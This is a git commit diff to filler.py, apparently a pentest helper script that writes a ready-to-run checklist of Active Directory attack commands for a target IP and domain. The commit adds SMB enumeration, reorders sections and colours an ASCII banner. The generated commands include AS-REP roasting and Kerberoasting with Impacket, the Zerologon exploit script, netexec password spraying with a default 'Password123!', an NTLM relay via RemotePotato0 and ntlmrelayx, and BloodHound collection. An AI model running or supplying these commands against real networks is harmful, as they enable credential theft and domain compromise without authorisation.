7dca4925d2ccc63b1a301a2b676072c61a837e75
timothyericsson <132996353+timothyericsson@users.noreply.github.com>
2024-11-14 18:17:29 +0700

    Update filler.py
    added SMB enum, rearranged commands, and made the ascii 1337 red color

--- filler.py
+++ filler.py
@@ -1,7 +1,11 @@
 import sys
 
 def create_ad_enumeration_file(target_ip, hostname, domain, local_ip, user, password):
-    ascii_art = r"""
+    # ANSI escape codes for red color and reset
+    RED = '\033[31m'
+    RESET = '\033[0m'
+
+    ascii_art = RED + r"""
            (  )   /\   _                 (
             \ |  (  \ ( \.(               )            _____
           \  \ \  `  `   ) \             (  ___                 (  )   /\   _
@@ -13,9 +17,9 @@ def create_ad_enumeration_file(target_ip, hostname, domain, local_ip, user, pass
            SAVING YOU    (             (               /    made with love by bandors (__/          \____/
               TIME SINCE  2024
 
-    """
-    # Open the AD_output.txt file in write mode
-    with open('AD_output.txt', 'w') as f:
+    """ + RESET
+    # Open the output.txt file in write mode
+    with open('output.txt', 'w') as f:
         f.write(ascii_art + '\n')
 
         # Add the Zone Transfer section
@@ -49,7 +53,7 @@ def create_ad_enumeration_file(target_ip, hostname, domain, local_ip, user, pass
             f.write(f"rpcclient -U \"\" -N {target_ip}\n")
         f.write("\n")
 
-        # Write As-Rep Roasting command
+        # Write AS-Rep Roasting command
         f.write("# AS Rep Roasting\n")
         f.write(f"for user in $(cat users.txt); do /usr/share/doc/python3-impacket/examples/GetNPUsers.py -no-pass -dc-ip {target_ip} {domain}/${{user}} | grep -v Impacket; done\n")
         f.write("\n")
@@ -61,15 +65,7 @@ def create_ad_enumeration_file(target_ip, hostname, domain, local_ip, user, pass
         if user and password:
             f.write(f"faketime -f +7h GetUserSPNs.py -request -dc-ip {target_ip} {domain}/{user} -save -outputfile GetUserSPNs.out\n")
 
-        f.write(f"GetUserSPNs.py -no-preauth '{user}' -usersfile 'users.txt' -dc-host '{hostname}.{domain}' '{domain}'/\n")
-        f.write("\n")
-
-        # Write password spraying command with provided password
-        f.write("# Password Spray\n")
-        if user and password:
-            f.write(f"netexec smb {target_ip} -u users.txt -p '{password}' --continue-on-success\n")
-        else:
-            f.write(f"netexec smb {target_ip} -u users.txt -p 'Password123!' --continue-on-success\n")
+        f.write(f"GetUserSPNs.py -no-preauth '{user if user else 'guest'}' -usersfile 'users.txt' -dc-host '{hostname}.{domain}' '{domain}'/\n")
         f.write("\n")
 
         # Write LDAP enumeration commands
@@ -83,15 +79,8 @@ def create_ad_enumeration_file(target_ip, hostname, domain, local_ip, user, pass
         f.write(f"sudo python ~/tools/CVE-2020-1472-master/cve-2020-1472-exploit.py {hostname} {target_ip}\n")
         f.write("\n")
 
-        # Write RemotePotato check commands
-        f.write("# RemotePotato Check\n")
-        f.write(f"sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:{target_ip}:9999\n")
-        f.write(f"sudo impacket-ntlmrelayx -t ldap://{target_ip} --no-wcf-server --escalate-user normal_user\n")
-        f.write(f".\\RemotePotato0.exe -m 2 -r {local_ip} -x {local_ip} -p 9999 -s 1\n")
-        f.write("\n")
-
         # Write Bloodhound Python command
-        f.write("# Bloodhound Python injestor\n")
+        f.write("# Bloodhound Python ingestor\n")
         if user and password:
             f.write(f"faketime -f +7h bloodhound-python -c ALL -u '{user}' -p '{password}' -d {domain} -dc {hostname}.{domain} -ns {target_ip}\n")
         else:
@@ -105,8 +94,33 @@ def create_ad_enumeration_file(target_ip, hostname, domain, local_ip, user, pass
             f.write(f"export KRB5CCNAME=./{user}.ccache\n")
             f.write(f"faketime -f +7h powerview {domain}/{user}@{target_ip} -k --no-pass --dc-ip {target_ip}\n")
             f.write("\n")
-        
-    print("AD_output.txt file generated successfully.")
+
+        # Write password spraying command with provided password
+        f.write("# Password Spray\n")
+        if user and password:
+            f.write(f"netexec smb {target_ip} -u users.txt -p '{password}' --continue-on-success\n")
+        else:
+            f.write(f"netexec smb {target_ip} -u users.txt -p 'Password123!' --continue-on-success\n")
+        f.write("\n")
+
+        # Write RemotePotato check commands
+        f.write("# RemotePotato Check\n")
+        f.write(f"sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:{target_ip}:9999\n")
+        f.write(f"sudo impacket-ntlmrelayx -t ldap://{target_ip} --no-wcf-server --escalate-user normal_user\n")
+        f.write(f".\\RemotePotato0.exe -m 2 -r {local_ip} -x {local_ip} -p 9999 -s 1\n")
+        f.write("\n")
+
+        # Write SMB Enumeration commands
+        if user and password:
+            f.write("# SMB Enumeration with credentials\n")
+            f.write(f"smbmap -u '{user}' -p '{password}' -H {target_ip}\n")
+        else:
+            f.write("# SMB Enumeration\n")
+            f.write(f"sudo smbclient -N -L //{target_ip}\n")
+            f.write(f"smbmap -u '' -p '' -H {target_ip}\n")
+        f.write("\n")
+
+    print("output.txt file generated successfully.")
 
 if __name__ == "__main__":
     # Get sys args if you want to take from command line; here taking from direct input for simplicity
@@ -117,5 +131,5 @@ if __name__ == "__main__":
     user = input("Enter User (can be blank): ")
     password = input("Enter Password (can be blank): ")
 
-    # Call the function to create the AD_output.txt file
+    # Call the function to create the output.txt file
     create_ad_enumeration_file(target_ip, hostname, domain, local_ip, user, password)
